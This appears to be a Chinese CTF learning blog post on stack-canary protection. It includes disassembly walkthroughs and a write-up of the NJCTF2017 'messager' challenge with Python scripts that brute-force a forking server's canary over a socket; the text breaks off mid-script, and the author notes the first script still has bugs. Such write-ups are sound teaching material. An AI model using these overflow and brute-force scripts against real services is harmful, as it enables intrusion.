            "content_html": "<p>分类、破解方法</p>\n<h1 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h1><p>​\t\t会把canary放到比返回地址还低的位置上,这样溢出的时候,从低地址向高地址溢出,就会覆盖掉canary.</p>\n<p>例子</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span> buf[<span class=\"number\">10</span>];</span><br><span class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%s&quot;</span>,buf);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-8-os%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6canary/image-20230219151606661.png\" alt=\"image-20230219151606661\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\"># gcc -fno-stack-protector canary.c -o fno.out</span></span><br><span class=\"line\"># python3 -c <span class=\"string\">&quot;print (&#x27;a&#x27;*30)&quot;</span> | ./fno.out</span><br><span class=\"line\">Segmentation <span class=\"title function_\">fault</span> <span class=\"params\">(core dumped)</span></span><br><span class=\"line\"><span class=\"meta\"># gcc -fstack-protector canary.c -o fno.out</span></span><br><span class=\"line\"># python3 -c &quot;<span class=\"title function_\">print</span> <span class=\"params\">(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">30</span>)</span>&quot; | ./fno.out</span><br><span class=\"line\">*** <span class=\"built_in\">stack</span> smashing detected ***: &lt;unknown&gt; terminated</span><br><span class=\"line\"><span class=\"title function_\">Aborted</span> <span class=\"params\">(core dumped)</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t64位和32位不一样,下面进行调试和查看反汇编代码来看一下</p>\n<h2 id=\"64位\"><a href=\"#64位\" class=\"headerlink\" title=\"64位\"></a>64位</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; disass main</span><br><span class=\"line\">Dump of assembler code for function main:</span><br><span class=\"line\">   0x00005555555546da &lt;+0&gt;:\tpush   rbp</span><br><span class=\"line\">   0x00005555555546db &lt;+1&gt;:\tmov    rbp,rsp</span><br><span class=\"line\">   0x00005555555546de &lt;+4&gt;:\tsub    rsp,0x20</span><br><span class=\"line\">   </span><br><span class=\"line\">   </span><br><span class=\"line\">   0x00005555555546e2 &lt;+8&gt;:\tmov    rax,QWORD PTR fs:0x28</span><br><span class=\"line\">   0x00005555555546eb &lt;+17&gt;:\tmov    QWORD PTR [rbp-0x8],rax</span><br><span class=\"line\">   </span><br><span class=\"line\">   </span><br><span class=\"line\">   0x00005555555546ef &lt;+21&gt;:\txor    eax,eax</span><br><span class=\"line\">   0x00005555555546f1 &lt;+23&gt;:\tlea    rax,[rbp-0x12]</span><br><span class=\"line\">   0x00005555555546f5 &lt;+27&gt;:\tmov    rsi,rax</span><br><span class=\"line\">   0x00005555555546f8 &lt;+30&gt;:\tlea    rdi,[rip+0xa5]        # 0x5555555547a4</span><br><span class=\"line\">   0x00005555555546ff &lt;+37&gt;:\tmov    eax,0x0</span><br><span class=\"line\">   0x0000555555554704 &lt;+42&gt;:\tcall   0x5555555545b0 &lt;__isoc99_scanf@plt&gt;</span><br><span class=\"line\">   0x0000555555554709 &lt;+47&gt;:\tnop</span><br><span class=\"line\">   </span><br><span class=\"line\">   0x000055555555470a &lt;+48&gt;:\tmov    rax,QWORD PTR [rbp-0x8]</span><br><span class=\"line\">=&gt; 0x000055555555470e &lt;+52&gt;:\txor    rax,QWORD PTR fs:0x28</span><br><span class=\"line\">   0x0000555555554717 &lt;+61&gt;:\tje     0x55555555471e &lt;main+68&gt;</span><br><span class=\"line\">   0x0000555555554719 &lt;+63&gt;:\tcall   0x5555555545a0 &lt;__stack_chk_fail@plt&gt;</span><br><span class=\"line\">   </span><br><span class=\"line\">   0x000055555555471e &lt;+68&gt;:\tleave</span><br><span class=\"line\">   0x000055555555471f &lt;+69&gt;:\tret</span><br><span class=\"line\">End of assembler dump.</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t注意看8 17 和 48 52 61 63这几行, 第一部分是开头. 从fs寄存器的偏移0x28位置取出(具体请查阅其他资料)后,放入rax,然后放入rbp-0x8的位置存储canary</p>\n<p>​\t\t函数返回前,从栈上取出来,然后做xor对比,如果一样的话,就都是0,跳转到main + 68,正常结束,如果不一样的话,就调用__stack_chk_fail函数,报错了.</p>\n<h2 id=\"32位\"><a href=\"#32位\" class=\"headerlink\" title=\"32位\"></a>32位</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; disass main</span><br><span class=\"line\">Dump of assembler code for function main:</span><br><span class=\"line\">   0x5655559d &lt;+0&gt;:\tlea    ecx,[esp+0x4]</span><br><span class=\"line\">   0x565555a1 &lt;+4&gt;:\tand    esp,0xfffffff0</span><br><span class=\"line\">   0x565555a4 &lt;+7&gt;:\tpush   DWORD PTR [ecx-0x4]</span><br><span class=\"line\">   0x565555a7 &lt;+10&gt;:\tpush   ebp</span><br><span class=\"line\">   0x565555a8 &lt;+11&gt;:\tmov    ebp,esp</span><br><span class=\"line\">   0x565555aa &lt;+13&gt;:\tpush   ebx</span><br><span class=\"line\">   0x565555ab &lt;+14&gt;:\tpush   ecx</span><br><span class=\"line\">   0x565555ac &lt;+15&gt;:\tsub    esp,0x10</span><br><span class=\"line\">   0x565555af &lt;+18&gt;:\tcall   0x565555f9 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class=\"line\">   0x565555b4 &lt;+23&gt;:\tadd    eax,0x1a20</span><br><span class=\"line\">   </span><br><span class=\"line\">   0x565555b9 &lt;+28&gt;:\tmov    ecx,DWORD PTR gs:0x14</span><br><span class=\"line\">   0x565555c0 &lt;+35&gt;:\tmov    DWORD PTR [ebp-0xc],ecx</span><br><span class=\"line\">   </span><br><span class=\"line\">   0x565555c3 &lt;+38&gt;:\txor    ecx,ecx</span><br><span class=\"line\">   0x565555c5 &lt;+40&gt;:\tsub    esp,0x8</span><br><span class=\"line\">   0x565555c8 &lt;+43&gt;:\tlea    edx,[ebp-0x16]</span><br><span class=\"line\">   0x565555cb &lt;+46&gt;:\tpush   edx</span><br><span class=\"line\">   0x565555cc &lt;+47&gt;:\tlea    edx,[eax-0x1934]</span><br><span class=\"line\">   0x565555d2 &lt;+53&gt;:\tpush   edx</span><br><span class=\"line\">   0x565555d3 &lt;+54&gt;:\tmov    ebx,eax</span><br><span class=\"line\">   0x565555d5 &lt;+56&gt;:\tcall   0x56555440 &lt;__isoc99_scanf@plt&gt;</span><br><span class=\"line\">=&gt; 0x565555da &lt;+61&gt;:\tadd    esp,0x10</span><br><span class=\"line\">   0x565555dd &lt;+64&gt;:\tnop</span><br><span class=\"line\">   </span><br><span class=\"line\">   0x565555de &lt;+65&gt;:\tmov    eax,DWORD PTR [ebp-0xc]</span><br><span class=\"line\">   0x565555e1 &lt;+68&gt;:\txor    eax,DWORD PTR gs:0x14</span><br><span class=\"line\">   0x565555e8 &lt;+75&gt;:\tje     0x565555ef &lt;main+82&gt;</span><br><span class=\"line\">   0x565555ea &lt;+77&gt;:\tcall   0x56555670 &lt;__stack_chk_fail_local&gt;</span><br><span class=\"line\">   </span><br><span class=\"line\">   </span><br><span class=\"line\">   0x565555ef &lt;+82&gt;:\tlea    esp,[ebp-0x8]</span><br><span class=\"line\">   0x565555f2 &lt;+85&gt;:\tpop    ecx</span><br><span class=\"line\">   0x565555f3 &lt;+86&gt;:\tpop    ebx</span><br><span class=\"line\">   0x565555f4 &lt;+87&gt;:\tpop    ebp</span><br><span class=\"line\">   0x565555f5 &lt;+88&gt;:\tlea    esp,[ecx-0x4]</span><br><span class=\"line\">   0x565555f8 &lt;+91&gt;:\tret</span><br><span class=\"line\">End of assembler dump.</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t关注28,35和65 - 77这几行,和64位的基本一样,就是canary的来源不同</p>\n<h1 id=\"题目练习\"><a href=\"#题目练习\" class=\"headerlink\" title=\"题目练习\"></a>题目练习</h1><h2 id=\"NJCTF2017-messager\"><a href=\"#NJCTF2017-messager\" class=\"headerlink\" title=\"NJCTF2017:messager\"></a>NJCTF2017:messager</h2><p>​\t\t64位程序</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-8-os%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6canary/image-20230226093403660.png\" alt=\"image-20230226093403660\"></p>\n<p>开了canary,要想办法绕过,然后开了nx,栈不可执行,要用rop之类的</p>\n<p>反汇编函数挺长的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">main</span><span class=\"params\">(__int64 a1, <span class=\"type\">char</span> **a2, <span class=\"type\">char</span> **a3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> optval; <span class=\"comment\">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">__pid_t</span> v5; <span class=\"comment\">// [rsp+4h] [rbp-Ch]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v6; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v6 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  sub_400B76(a1, a2, a3);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;[+]start..&quot;</span>);</span><br><span class=\"line\">  addr.sa_family = <span class=\"number\">2</span>;</span><br><span class=\"line\">  *(_WORD *)addr.sa_data = htons(<span class=\"number\">0x15B3</span>u);</span><br><span class=\"line\">  *(_DWORD *)&amp;addr.sa_data[<span class=\"number\">2</span>] = htonl(<span class=\"number\">0</span>);</span><br><span class=\"line\">  len = <span class=\"number\">16</span>;</span><br><span class=\"line\">  addr_len = <span class=\"number\">16</span>;</span><br><span class=\"line\">  v5 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;[+]socket..&quot;</span>);</span><br><span class=\"line\">  dword_602140 = socket(<span class=\"number\">2</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( dword_602140 &lt; <span class=\"number\">0</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    perror(<span class=\"string\">&quot;socket&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0xFFFFFFFF</span>LL;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  optval = <span class=\"number\">1</span>;</span><br><span class=\"line\">  setsockopt(dword_602140, <span class=\"number\">1</span>, <span class=\"number\">2</span>, &amp;optval, <span class=\"number\">4u</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;[+]bind..&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( bind(dword_602140, &amp;addr, len) &lt; <span class=\"number\">0</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    perror(<span class=\"string\">&quot;bind error&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0xFFFFFFFF</span>LL;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;[+]listen..&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( listen(dword_602140, <span class=\"number\">1024</span>) &lt; <span class=\"number\">0</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    perror(<span class=\"string\">&quot;listen&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0xFFFFFFFF</span>LL;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    fd = accept(dword_602140, &amp;stru_602130, &amp;addr_len);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( fd == <span class=\"number\">-1</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      perror(<span class=\"string\">&quot;accept&quot;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">0xFFFFFFFF</span>LL;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    send(fd, <span class=\"string\">&quot;Welcome!\\n&quot;</span>, <span class=\"number\">9uLL</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">    v5 = fork();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v5 == <span class=\"number\">-1</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      perror(<span class=\"string\">&quot;fork&quot;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">0xFFFFFFFF</span>LL;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !v5 )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    close(fd);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  signal(<span class=\"number\">14</span>, handler);</span><br><span class=\"line\">  alarm(<span class=\"number\">3u</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)sub_400BE9() )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( send(fd, <span class=\"string\">&quot;Message receive failed\\n&quot;</span>, <span class=\"number\">0x19</span>uLL, <span class=\"number\">0</span>) == <span class=\"number\">-1</span> )</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_14;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( send(fd, <span class=\"string\">&quot;Message received!\\n&quot;</span>, <span class=\"number\">0x12</span>uLL, <span class=\"number\">0</span>) == <span class=\"number\">-1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">LABEL_14:</span><br><span class=\"line\">    perror(<span class=\"string\">&quot;send&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0xFFFFFFFF</span>LL;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">sub_400BE9</span><br><span class=\"line\">  __int64 <span class=\"title function_\">sub_400BE9</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> s[<span class=\"number\">104</span>]; <span class=\"comment\">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v2; <span class=\"comment\">// [rsp+78h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v2 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;csfd = %d\\n&quot;</span>, (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)fd);</span><br><span class=\"line\">  bzero(s, <span class=\"number\">0x64</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)recv(fd, s, <span class=\"number\">0x400</span>uLL, <span class=\"number\">0</span>) == <span class=\"number\">-1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    perror(<span class=\"string\">&quot;recv&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0xFFFFFFFF</span>LL;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Message come: %s&quot;</span>, s);</span><br><span class=\"line\">    fflush(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>sub_400BE9 这里接收的值的大小是0x400,超了s的104,存在栈溢出</p>\n<p>所以可以让每次fork的子进程来尝试</p>\n<p>问题是fork了之后是怎么个执行流? 父进程还在while循环,子进程呢?</p>\n<p>fork调用的一个奇妙之处就是它仅仅被调用一次，却能够返回两次，它可能有三种不同的返回值：</p>\n<p>(1)在父进程中，fork返回新创建子进程的进程ID；</p>\n<p>(2)在子进程中，fork返回0；</p>\n<p>(3)如果出现错误，fork返回一个<a href=\"https://baike.baidu.com/item/%E8%B4%9F%E5%80%BC?fromModule=lemma_inlink\">负值</a>。</p>\n<p>所以父进程会一直在while里循环,不会实际上接收到值,子进程才会接收到值,所以子进程崩了不影响父进程,就可以进行爆破canary</p>\n<p>Could not allocate dynamic translator buffer</p>\n<p>重新安装一下checksec</p>\n<p>查看端口根据进程号 </p>\n<p>netstat -anlp | grep “mess”</p>\n<p>看不懂要怎么连接…先百度一波。应该要有端口的呀</p>\n<p>socket(domain, type, protocol);</p>\n<p>accept(fd, addr, addr_len);</p>\n<p>listen(fd, n);</p>\n<p>汇编代码里写哪了呢?</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-8-os%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6canary/image-20221010212350634.png\" alt=\"image-20221010212350634\"></p>\n<p>​\t\t获取canary脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">canary = <span class=\"string\">b&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">8</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">256</span>):</span><br><span class=\"line\">        s = socket.socket()</span><br><span class=\"line\">        s.connect((<span class=\"string\">&quot;127.0.0.1&quot;</span>,<span class=\"number\">5555</span>))</span><br><span class=\"line\">        ret = s.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">        j = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">104</span> + <span class=\"built_in\">chr</span>(j).encode(<span class=\"string\">&quot;utf-8&quot;</span>)</span><br><span class=\"line\">        s.send(j)</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            ret = s.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span>  <span class=\"string\">b&quot;Message received!&quot;</span> <span class=\"keyword\">in</span> ret:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&quot;success&quot;</span>)</span><br><span class=\"line\">                canary += <span class=\"built_in\">chr</span>(j)</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(canary)</span><br><span class=\"line\">                s.close()</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            <span class=\"keyword\">continue</span>      </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t但是这个脚本的问题,<font color=\"red\">好像在爆破canary的时候还是会有问题….先不管了…这个问题耽搁太久了,后面再研究</font></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">canary = <span class=\"string\">b&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">8</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;tiao nale&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(canary)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">256</span>):</span><br><span class=\"line\">        s = socket.socket()</span><br><span class=\"line\">        s.connect((<span class=\"string\">&quot;127.0.0.1&quot;</span>,<span class=\"number\">5555</span>))</span><br><span class=\"line\">        ret = s.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">        data = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">104</span> +canary +  <span class=\"built_in\">chr</span>(j).encode(<span class=\"string\">&quot;utf-8&quot;</span>)</span><br><span class=\"line\">        <span class=\"comment\">#print(data)</span></span><br><span class=\"line\">        s.send(data)</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            ret = s.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span>  <span class=\"string\">b&quot;Message received!&quot;</span> <span class=\"keyword\">in</span> ret:</span><br><span class=\"line\">                <span class=\"comment\">#print(&quot;success&quot;)</span></span><br><span class=\"line\">                canary += <span class=\"built_in\">bytes</span>(<span class=\"built_in\">chr</span>(j).encode(<span class=\"string\">&quot;utf-8&quot;</span>))</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(e)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">s = socket.socket()</span><br><span class=\"line\">s.connect((<span class=\"string\">&quot;127.0.0.1&quot;</span>,<span class=\"number\">5555</span>))</span><br><span class=\"line\">ret = s.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">s.send(<span class=\"string\">b&quot;a&quot;</span>*<span 